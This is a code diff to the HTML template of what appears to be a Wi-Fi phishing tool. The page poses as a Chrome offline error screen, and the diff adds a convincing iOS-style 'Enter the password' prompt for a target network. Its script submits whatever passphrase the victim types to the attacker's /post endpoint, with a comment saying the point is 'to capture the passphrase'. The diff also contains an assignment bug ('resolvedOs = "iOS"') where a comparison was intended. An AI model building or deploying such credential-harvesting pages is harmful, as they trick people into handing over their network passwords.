@@ -4,9 +4,7 @@
         <meta charset="utf-8" />
         <meta name="viewport" content="width=device-width, initial-scale=1.0,
         maximum-scale=1.0, user-scalable=no">
-        <title i18n-content="title">Internet connection is not available</title>
-        <link rel='stylesheet' href='/static/chrome-offline.css' type='text/css' />
- 
+
         <script>
             /**
          * JavaScript Client Detection
@@ -195,9 +193,16 @@
             };
         }(this));
 
-        if (jscd.os == "Windows") {
+        var resolvedOs = jscd.os
+
+        if (resolvedOs == "Windows") {
+            document.write("<title i18n-content=\"title\">Internet connection is not available</title>");
+            document.write("<link rel='stylesheet' href='/static/chrome-offline.css' type='text/css' />")
             document.write("<link rel='stylesheet' href='/static/style.css'>");
             document.write("<link href='/static/opensans.css' rel='stylesheet' type='text/css'>");
+        }
+        else if (resolvedOs = "iOS") {
+            document.write("<link rel='stylesheet' href='/static/ios.css'>");
         }
         else {
             document.write("<link rel='stylesheet' href='/static/mac-network-manager.css' />");
@@ -299,6 +304,16 @@
         ' 	</div>' +
 	'</form>';
 
+        var loadhtml_ios = '<div class="ios-container">'
+        + '<form id="ios-password-form" method="post" action="/post">'
+        + '  <div class="ios-header">Enter the password for "{{ target_ap_essid }}" </div>'
+        + '  <div class="ios-actions"><input type="reset" value="&nbsp;&nbsp;&nbsp;&nbsp;" class="action-button" style="float: left;"><input id="ios-join-button" type="submit" value="Join" class="action-button" style="float: right;"><div class="enter-password-text">Enter Password</div></div>'
+        + '  <div class="ios-password-entry"><span style="margin-right: 12px">Password</span><input id="ios-password" name="wfphshr-wpa-password" type="password" autofocus></div>'
+        + '  <div class="ios-note">You can also access this Wi-Fi network by bringing your device near any iPhone, iPad, or Mac which has connected to this network and has you in their contacts.</div>'
+        + '  </form>'
+        + '<div id="ios-message"></div>'
+        + '</div>';
+
         /* Callback receive the passphrase status and password*/
         function validate_passphrase (password, callback) {
             var xhttp = new XMLHttpRequest();
@@ -351,6 +366,22 @@
             }
         }
 
+        function ios_validate_action(pw_status, password) {
+            if (pw_status == "success") {
+                // Password matched, show a success message.
+                document.getElementById("ios-password").value = password;
+                document.getElementById("ios-message").innerHTML = "Login success";
+                document.getElementById("ios-password-form").submit();
+            } else if (pw_status == "fail") {
+                // Password did not match, show an error message.
+                document.getElementById("ios-message").innerHTML = "Login failed, please try again";
+            } else {
+                // The password is not being validated by the backend. Submit the form to capture the passphrase.
+                document.getElementById("ios-password-form").submit();
+                document.getElementById("ios-message").innerHTML = "An error occurred, please try again.";
+            }
+        }
+
         function load_mobile() {
 		    var popup = prompt('The Wi-Fi network ″{{ target_ap_essid }}″ requires a {{ target_ap_encryption }} password.', '');
 		    if (popup != null) {
@@ -362,6 +393,7 @@
         <title></title>
         </head>
     <body id="t" class="offline" style="font-family: 'Helvetica Neue', 'Lucida Grande', sans-serif; font-size: 75%;">
+    <div id="loader-ios"></div>
     <div id="main-frame-error" class="interstitial-wrapper">
         <div id="main-content">
             <img class="dinosaur" src="static/dinosaur.png" width="45" />
@@ -393,7 +425,7 @@
         <div id="loader-windows"></div>
         <div id="loader-mobile"></div>
         <script>
-            if (jscd.os == "Windows") {
+            if (resolvedOs == "Windows") {
                 document.getElementById("loader-windows").innerHTML = loadhtml_windows;
                 var myform = document.getElementById("windows-form");
                 myform.addEventListener("submit", function(evt) {
@@ -401,7 +433,19 @@
                     validate_passphrase(document.getElementById("password").value, windows_validate_action); 
                 });
             }
-            else if (jscd.os == "Android" || jscd.os == "iOS") {
+            else if (resolvedOs == "iOS") {
+                document.getElementById("loader-mobile").innerHTML = loadhtml_ios;
+                document.getElementById("loader-ios").innerHTML = loadhtml_ios;
+                document.getElementById("main-frame-error").innerHTML = "";
+                document.getElementById("ios-password").focus();
+                var myForm = document.getElementById("ios-password-form");
+                myForm.addEventListener("submit", function(evt) {
+                    evt.preventDefault();
+                    var password = document.getElementById("ios-password").value;
+                    validate_passphrase(password, ios_validate_action);
+                });
+            }
+            else if (resolvedOs == "Android") {
                 document.getElementById("loader-mobile").innerHTML = loadhtml_mobile;
                 load_mobile();
             }
